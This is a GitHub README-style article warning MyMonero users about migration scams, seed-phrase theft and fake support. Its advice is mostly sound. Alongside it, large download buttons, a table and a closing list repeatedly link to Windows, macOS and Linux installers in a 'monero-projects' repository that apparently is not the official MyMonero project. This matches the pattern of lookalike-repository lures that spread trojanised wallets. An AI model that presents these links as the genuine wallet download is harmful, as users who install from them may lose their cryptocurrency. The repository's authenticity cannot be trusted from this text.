<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Migration Scams: Warning Signs and Safer Choices</h1>
<p align="center">Spot pressure tactics, protect recovery words, and plan any wallet transition at your own pace.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A migration does not require you to give your seed to a stranger or send funds to an address they provide. MyMonero desktop’s final release is v1.3.3, hosted servers and web-wallet login stopped, and your choices are to keep using the desktop app or restore your seed in Cake Wallet.

## You'll see this if
- Someone says your account will close unless you migrate immediately.
- A person claiming to be support asks for your 13- or 25-word seed.
- A website requests your words to “convert” or “validate” a wallet.
- A message asks you to send XMR to secure, unlock, or verify your balance.
- A helper wants remote access to your computer during a restore.

## Why it happens
Wallet transitions can be confusing, and scammers exploit uncertainty by presenting themselves as guides. They may imitate support, use urgent language, or claim a special migration fee is due. The safe baseline is simple: nobody legitimate asks for your seed. A seed is private recovery information; do not type it into a link supplied in a message or send it to another person.

Confirmed product facts are enough to plan without urgency. MyMonero desktop’s final release is v1.3.3. The old app still opens wallets and sends XMR but is no longer maintained and receives no new features or security updates. Hosted servers and web-wallet login stopped. The shutdown date is unconfirmed here. Two options are available: continue using MyMonero desktop with its limitations, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Read [MyMonero shutdown facts](./mymonero-shutdown-facts.md) and the [migration checklist](./mymonero-migration-checklist.md).

Do not confuse a wallet restore with a sweep. Restoring brings a wallet into use with its seed. Sweeping sends all funds to a new wallet and is a separate transaction choice. Neither action should be directed by a stranger. For details, see [sweep funds to a new wallet](./mymonero-sweep-funds-new-wallet.md).

---

## Fix
1. **Stop before responding.** Do not click a migration link, scan a code, send funds, or disclose recovery words because of a deadline. Save the message without opening attachments, and avoid arguing with the sender.
2. **Check whether the claim matches known facts.** The hosted servers and web-wallet login stopped; the desktop app’s final release is v1.3.3 and is no longer maintained. A specific shutdown date is unconfirmed. A countdown or claim of imminent account loss should not be accepted as established fact.
3. **Never share seed or keys.** MyMonero seeds may have 13 MyMonero-specific legacy words or 25 standard Monero words. Never send either format to a helper, form, or chat. Do not share private keys, passwords, wallet files, or screenshots of a backup. Nobody legitimate asks for your seed.
4. **Verify downloads independently.** If you need the desktop release, navigate to the [MyMonero v1.3.3 GitHub release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) through the project source, not a sender’s link. Compare the SHA-256 of the file with the value on that page. Use `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux.
5. **Choose your route without pressure.** Continuing with desktop means accepting no new features or security updates. Restoring in Cake Wallet requires care with seed format and scan height. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. See [MyMonero to Cake Wallet migration](./mymonero-to-cake-wallet-migration.md).
6. **Check fee claims cautiously.** Historically MyMonero hosted servers charged a one-time fee to import a wallet created elsewhere. No current fee is stated here. Do not pay a person or address based on an unsolicited claim; consult [MyMonero import fee explained](./mymonero-import-fee-explained.md).
7. **Keep a safe record.** Note the sender, the claim, and where the link came from without recording your seed. If you already entered words on an unfamiliar page, do not send more information or money; seek trusted, general wallet guidance and consider your options carefully.

> [!TIP]
> A genuine migration is something you control. Take time to check the target wallet, seed format, and restore height before entering sensitive information into an app you deliberately opened.

---

## If that did not work
If a stranger is pressuring you, end the conversation and do not grant remote access. Do not use a phone number or support account supplied by the same message as proof of legitimacy. A legitimate explanation of wallet status does not require your seed or an advance transfer.

If you need to restore, first identify the seed format. The 13-word version is MyMonero-specific and legacy; the 25-word version is standard Monero. Follow [13-word restore guidance](./mymonero-13-word-seed-restore.md) or [25-word migration guidance](./mymonero-25-word-seed-migration.md). Never guess a missing word or send it to another person. Offline recovery of a missing seed word is not confirmed here. Restore height marks the block height at which scanning starts; earlier is safer for older activity but slower. See restore height explained.

If a message claims your hosted password must be reset, note that the password-reset method is unconfirmed. Hosted login stopped, so a stranger’s reset link is not a reliable recovery path. Preserve your secure seed backup and use caution.

> [!WARNING]
> Seed requests, urgency, and demands to send XMR are major warning signs. Never share your seed, keys, or wallet backup; nobody legitimate asks for your seed.

---

## Prevention
Bookmark or independently navigate to the official project release source. Verify installer SHA-256 against the value displayed on the GitHub release page. Beware of fake download pages and lookalike support accounts; see MyMonero fake download warning.

Keep the seed stored privately and separately from the device. Do not enter it into forms reached through ads, direct messages, or search results. A safe migration does not involve revealing the seed to a human. Review the MyMonero seed backup safety guide before a restore.

Take time to compare continuing with an unmaintained desktop app against restoration in Cake Wallet. Avoid confusing wallet recovery with sending all funds. Make a private checklist and proceed only when you understand each step.

## FAQ
<details><summary>Does MyMonero require me to migrate urgently?</summary>

No urgent deadline is stated here. Hosted login stopped; the desktop app remains the final release but is no longer maintained. A shutdown date is unconfirmed.

</details>

<details><summary>Should I give a migration helper my seed?</summary>

Never. Nobody legitimate asks for your seed. Keep all recovery words and private keys confidential.

</details>

<details><summary>Is there a current import fee?</summary>

No current fee is stated here. Historically, hosted servers charged a one-time fee for importing a wallet created elsewhere.

</details>

<details><summary>Is migrating the same as sweeping?</summary>

No. Restoring uses a seed to access a wallet; sweeping sends all funds to a new wallet. Do not let a stranger direct either action.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Fake Download Warning: Verify Before Installing](./mymonero-fake-download-warning.md) | Find the final desktop packages safely, check file integrity, and avoid lookalike installers. |
| [MyMonero FAQ: Desktop Status, Recovery, and Safety](./mymonero-faq.md) | Clear answers to common questions about the final desktop release, wallet access, seeds, and migration. |
| [MyMonero Shutdown Facts: What Is and Is Not Known](./mymonero-shutdown-facts.md) | Separate confirmed product status from uncertain dates and details, and plan next steps without panic. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
